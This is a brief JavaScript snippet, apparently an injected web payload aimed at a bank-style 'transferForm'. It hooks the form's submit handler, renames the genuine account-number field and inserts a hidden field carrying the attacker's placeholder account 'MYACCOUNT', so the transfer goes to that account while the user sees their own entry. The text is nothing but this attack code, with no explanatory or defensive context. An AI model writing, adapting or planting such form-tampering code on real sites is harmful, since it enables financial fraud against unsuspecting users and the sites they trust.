var myForm = document.forms["transferForm"];
var previousOnSubmit = myForm.onsubmit;
myForm.onsubmit = function() {
  if(previousOnSubmit !== undefined && previousOnSubmit()) {
    var hf = document.createElement('input');
    hf.type = 'hidden';
    hf.name = 'accountNumber';
    hf.value = 'MYACCOUNT';

    myForm['accountNumber'].name = 'accountNumberMock';
    myForm.appendChild(hf);
    myForm.submit();
  }

  return true;
}
